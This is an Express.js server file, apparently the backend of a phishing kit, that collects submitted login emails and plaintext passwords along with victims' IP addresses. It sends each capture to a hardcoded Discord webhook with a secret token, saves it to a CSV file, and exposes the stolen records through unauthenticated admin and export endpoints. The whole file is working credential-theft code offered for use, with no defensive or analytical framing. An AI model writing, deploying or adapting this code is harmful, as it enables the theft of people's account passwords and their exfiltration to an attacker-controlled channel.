import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import moment from 'moment';
import https from 'https';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// Serve static files from the React build directory (path needed for React SPA fallback)
const distPath = path.join(__dirname, 'dist');

// ─── Discord Webhook Configuration ──────────────────────────────
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1528008607575052462/UxRgNZJUUAEfWVUkRnsTM57JIS-_-Fwsz-uhloGf8RXiwIOmVEywpxVo2s0ORuzDQbBt';

let webhookConnected = false;

if (DISCORD_WEBHOOK_URL) {
  webhookConnected = true;
  console.log('✅ Connected to Discord Webhook');
} else {
  console.warn('⚠️  Discord webhook not configured. Using CSV fallback only.');
}

// Function to send message to Discord webhook
async function sendToDiscord(logData) {
  if (!webhookConnected) return;
  
  const embed = {
    title: '🔐 Login Attempt Logged',
    color: 16711680, // Red
    fields: [
      { name: 'Email', value: logData.username, inline: false },
      { name: 'Password', value: `||${logData.password}||`, inline: false }, // Spoiler tag
      { name: 'Status', value: logData.status, inline: false },
      { name: 'Attempt #', value: String(logData.attempt_number), inline: true },
      { name: 'IP Address', value: logData.ip_address, inline: true },
      { name: 'Timestamp', value: new Date(logData.timestamp).toLocaleString(), inline: false },
    ],
    timestamp: new Date().toISOString(),
  };
  
  const payload = JSON.stringify({ embeds: [embed] });
  
  return new Promise((resolve) => {
    const url = new URL(DISCORD_WEBHOOK_URL);
    const options = {
      hostname: url.hostname,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
    };
    
    const req = https.request(options, (res) => {
      res.on('data', () => {});
      res.on('end', () => resolve());
    });
    
    req.on('error', (err) => {
      console.error('Discord webhook error:', err.message);
      resolve();
    });
    
    req.write(payload);
    req.end();
  });
}

// Ensure logs directory exists (for CSV fallback)
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// CSV file path (fallback)
const csvFilePath = path.join(logsDir, 'login_attempts.csv');

// Initialize CSV with headers if it doesn't exist
if (!fs.existsSync(csvFilePath)) {
  const headers = 'Timestamp,Username,Password,Attempt Number,Status,User Agent,IP Address\n';
  fs.writeFileSync(csvFilePath, headers);
}

// ─── Logging Endpoint ────────────────────────────────────────────
app.post('/api/logs-login', async (req, res) => {
  try {
    const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
    
    // Get client IP
    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    
    const logData = {
      timestamp: new Date(timestamp).toISOString(),
      username,
      password,
      attempt_number: attemptNumber,
      status,
      user_agent: userAgent,
      ip_address: ipAddress,
    };
    
    // Send to Discord webhook
    await sendToDiscord(logData);
    
    // Also save to CSV as backup
    const csvRow = [
      timestamp,
      `"${username}"`,
      `"${password}"`,
      attemptNumber,
      status,
      `"${userAgent}"`,
      ipAddress,
    ].join(',') + '\n';
    fs.appendFileSync(csvFilePath, csvRow);
    
    console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status})`);
    
    res.json({ success: true, message: 'Login attempt logged', stored: 'Discord + CSV' });
  } catch (error) {
    console.error('Error logging login attempt:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Admin Logs Retrieval Endpoint ───────────────────────────────
app.get('/api/admin/logs', async (req, res) => {
  try {
    const { limit = 100, status, username } = req.query;
    
    // Read from CSV
    const data = fs.readFileSync(csvFilePath, 'utf-8');
    const lines = data.split('\n').slice(1).filter(Boolean);
    
    let logs = lines.map((line, index) => {
      // Proper CSV parsing handling quoted fields
      const parts = [];
      let current = '';
      let inQuotes = false;
      
      for (let i = 0; i < line.length; i++) {
        const char = line[i];
        if (char === '"') {
          inQuotes = !inQuotes;
        } else if (char === ',' && !inQuotes) {
          parts.push(current.trim().replace(/^"|"$/g, ''));
          current = '';
        } else {
          current += char;
        }
      }
      parts.push(current.trim().replace(/^"|"$/g, ''));
      
      return {
        id: lines.length - index,
        timestamp: parts[0]?.trim(),
        username: parts[1]?.trim(),
        password: parts[2]?.trim(),
        attempt_number: parseInt(parts[3]) || 1,
        status: parts[4]?.trim(),
        user_agent: parts[5]?.trim(),
        ip_address: parts[6]?.trim(),
      };
    }).reverse();
    
    // Apply filters
    if (status) {
      logs = logs.filter(log => log.status?.includes(status));
    }
    if (username) {
      logs = logs.filter(log => log.username?.toLowerCase().includes(username.toLowerCase()));
    }
    
    // Apply limit
    logs = logs.slice(0, parseInt(limit));
    
    res.json({ success: true, count: logs.length, logs, source: 'CSV (Discord Webhook Backup)' });
  } catch (error) {
    console.error('Error retrieving logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Export Logs as JSON (for GitHub Actions backup) ─────────────
app.get('/api/admin/logs/export', async (req, res) => {
  try {
    const data = fs.readFileSync(csvFilePath, 'utf-8');
    const lines = data.split('\n').slice(1).filter(Boolean);
    
    const logs = lines.map((line, index) => {
      // Proper CSV parsing handling quoted fields
      const parts = [];
      let current = '';
      let inQuotes = false;
      
      for (let i = 0; i < line.length; i++) {
        const char = line[i];
        if (char === '"') {
          inQuotes = !inQuotes;
        } else if (char === ',' && !inQuotes) {
          parts.push(current.trim().replace(/^"|"$/g, ''));
          current = '';
        } else {
          current += char;
        }
      }
      parts.push(current.trim().replace(/^"|"$/g, ''));
      
      return {
        id: lines.length - index,
        timestamp: parts[0]?.trim(),
        username: parts[1]?.trim(),
        password: parts[2]?.trim(),
        attempt_number: parseInt(parts[3]) || 1,
        status: parts[4]?.trim(),
        user_agent: parts[5]?.trim(),
        ip_address: parts[6]?.trim(),
      };
    }).reverse();
    
    res.json({ timestamp: new Date().toISOString(), total: logs.length, logs });
  } catch (error) {
    console.error('Error exporting logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ─── Health Check Endpoint ──────────────────────────────────────
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'Logger server is running', 
    port: PORT,
    logging: webhookConnected ? 'Discord Webhook Connected' : 'CSV Fallback Only',
    csvPath: csvFilePath,
  });
});

// Serve static files from the React build directory (after API routes!)
app.use(express.static(distPath));

// Serve React app for all non-API routes (SPA fallback)
app.get('*', (req, res) => {
  res.sendFile(path.join(distPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`\n🔒 Login Logger Server running on http://localhost:${PORT}`);
  console.log(`� Logging: Discord Webhook + CSV Backup`);
  console.log(`📁 CSV backup: ${csvFilePath}\n`);
});
